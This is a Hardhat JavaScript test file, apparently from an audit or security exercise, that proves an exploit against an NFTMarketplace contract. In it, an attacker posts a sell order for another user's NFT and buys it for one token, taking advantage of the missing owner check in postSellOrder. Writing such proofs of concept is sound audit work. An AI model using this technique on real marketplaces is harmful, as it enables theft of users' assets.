const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[NFTMarketplace] Exploits', function() {
	let deployer, governance, users, attacker;

	before(async function() {
		[deployer, governance, alice, bob, charlie, attacker] = await ethers.getSigners();
		users = [alice, bob, charlie, attacker];

		this.token = await (await ethers.getContractFactory('ApeCoin', deployer)).deploy();
		this.nfts = await (await ethers.getContractFactory('HalbornNFT', deployer)).deploy();
		this.marketplace = await (await ethers.getContractFactory('NFTMarketplace', deployer)).deploy(governance.address, this.token.address, this.nfts.address);

		for (let i = 0; i < users.length; ++i){
			await (await this.token.connect(users[i])).approve(this.marketplace.address, ethers.constants.MaxUint256); // Set maximum allowance for transferring ApeCoin
			await (await this.nfts.connect(users[i])).setApprovalForAll(this.marketplace.address, true); // Allow marketplace to transfer NFTs from its users
			await this.nfts.safeMint(users[i].address, i); // Mint NFT #0 for Alice, #1 for Bob, #2 for Charlie and #3 for attacker 
			expect(
				await this.nfts.ownerOf(i)
			).to.be.equal(users[i].address);
		}
	});

	it('[postSellOrder] No validation that the poster of the sell order is the owner of the NFT', async function() {
		this.token.mint(attacker.address, 1); // Give only 1 token to attacker
		expect(
			await this.token.balanceOf(attacker.address)
		).to.be.equal(1);

		expect(
			await this.nfts.ownerOf(0)
		).to.be.equal(alice.address); // Make sure owner of NFT is Alice before the attack 

		let attackerInstance = await this.marketplace.connect(attacker);
		await attackerInstance.postSellOrder(0, 1); // Post sell order for Alice's NFT for 1 token
		await attackerInstance.buySellOrder(0); // Buy it for ourselves

		expect(
			await this.nfts.ownerOf(0)
		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT for only 1 token !
	});

	after(async function() {

	});
});